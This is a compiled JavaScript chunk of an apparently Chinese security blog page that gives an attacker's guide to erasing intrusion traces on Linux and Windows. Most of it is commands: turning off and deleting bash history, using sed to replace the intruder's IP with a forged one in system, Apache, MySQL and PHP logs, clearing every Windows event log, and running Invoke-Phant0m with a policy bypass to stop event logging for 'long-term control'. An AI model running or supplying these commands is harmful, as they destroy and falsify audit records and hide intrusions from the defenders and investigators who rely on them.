(window.webpackJsonp=window.webpackJsonp||[]).push([[65],{804:function(t,s,a){"use strict";a.r(s);var e=a(105),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"linux日志处理"}},[t._v("Linux日志处理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux日志处理"}},[t._v("#")])]),t._v(" "),a("h2",{attrs:{id:"bash日志处理"}},[t._v("Bash日志处理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#bash日志处理"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("bash去掉history记录，让系统不记录history")])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("export")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[t._v("HISTSIZE")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("export")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[t._v("HISTFILE")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/dev/null\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("history命令的清除，也是对~/.bash_history进行定向清除")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("rm")]),t._v(" -rf ~/.bash_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("history")]),t._v(" -c\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("h2",{attrs:{id:"系统日志"}},[t._v("系统日志 "),a("a",{staticClass:"header-anchor",attrs:{href:"#系统日志"}},[t._v("#")])]),t._v(" "),a("p",[t._v("直接将日志清除过于明显，一般使用sed进行定向清除或伪造")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[t._v("日志文件")]),t._v(" "),a("th",{staticStyle:{"text-align":"left"}},[t._v("说明")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("/var/log/btmp")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("记录"),a("strong",[t._v("错误登录（登陆失败）"),a("strong",[t._v("日志；使用")]),t._v("lastb")]),t._v("命令查看")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("/var/log/lastlog")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("记录系统中所有用户最后一次成功登录时间，使用"),a("strong",[t._v("lastlog")]),t._v("命令查看")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("/var/log/wtmp")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用"),a("strong",[t._v("last")]),t._v("命令来查看")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("/var/log/utmp")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("只记录"),a("strong",[t._v("当前登录用户")]),t._v("的信息；使用"),a("strong",[t._v("w,who,users")]),t._v("等命令来查询")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("/var/log/secure")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码（Centos）")])])])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP，-i直接编辑文件，必须在后边")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" -i /var/log/btmp*\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" -i /var/log/lastlog\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" -i /var/log/wtmp\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" -i secure\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" -i /var/log/utmp\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br")])]),a("h2",{attrs:{id:"web日志处理"}},[t._v("Web日志处理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#web日志处理"}},[t._v("#")])]),t._v(" "),a("p",[t._v("如apache的access.log,error.log。")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/access.log\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/error_log\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("h2",{attrs:{id:"mysql日志文件"}},[t._v("MySQL日志文件 "),a("a",{staticClass:"header-anchor",attrs:{href:"#mysql日志文件"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("log-error"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/var/log/mysql/mysql_error.log\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#错误日志")]),t._v("\nlog-slow-queries"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/var/log/mysql/mysql_slow.log\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#慢查询日志")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" –i /var/log/mysql/mysql_error.log\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/8.8.8.8/g'")]),t._v(" –i /var/log/mysql/mysql_slow.log\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("h2",{attrs:{id:"php日志处理"}},[t._v("php日志处理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php日志处理"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sed")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s/192.168.1.3/192.168.1.4/g'")]),t._v(" –i /var/log/apache/php_error.log \n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h1",{attrs:{id:"windows日志处理"}},[t._v("Windows日志处理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#windows日志处理"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("对于Windows事件日志分析，不同的EVENT ID代表了不同的意义")])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[t._v("事件ID")]),t._v(" "),a("th",{staticStyle:{"text-align":"left"}},[t._v("说明")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4648")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("登录成功，会记录登录来源IP")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4625")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("登录失败，会记录登录来源IP")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4672")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("使用超级用户（如管理员）进行特殊登录，不会记录IP")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4720")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("创建用户")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4733")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("从用户组删除用户")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("4779")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("注销事件，会记录登录来源IP")])])])]),t._v(" "),a("h2",{attrs:{id:"一、wevtutil-for循环清除所有日志"}},[t._v("一、wevtutil+for循环清除所有日志 "),a("a",{staticClass:"header-anchor",attrs:{href:"#一、wevtutil-for循环清除所有日志"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-cmd line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('for /F "tokens=*" %a in (\'wevtutil.exe el\') DO wevtutil.exe cl "%a"\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"二、-ps批量删日志"}},[t._v("二、 ps批量删日志 "),a("a",{staticClass:"header-anchor",attrs:{href:"#二、-ps批量删日志"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-cmd line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('PS C:\\> wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"三、运行ps脚本"}},[t._v("三、运行ps脚本 "),a("a",{staticClass:"header-anchor",attrs:{href:"#三、运行ps脚本"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("powershell –exec bypass –Command "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"& {Import-Module 'C:\\Invoke-Phant0m.ps1';Invoke-Phant0m}\"")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#win日志服务此时就会停止工作了")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#长期控制，记得验证")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("blockquote",[a("p",[t._v("不过这种方法太过暴力，而且停止日志记录这个方法停止后无法恢复")]),t._v(" "),a("p",[t._v("稳妥点还是手动删除登录事件")])])])}),[],!1,null,null,null);s.default=n.exports}}]);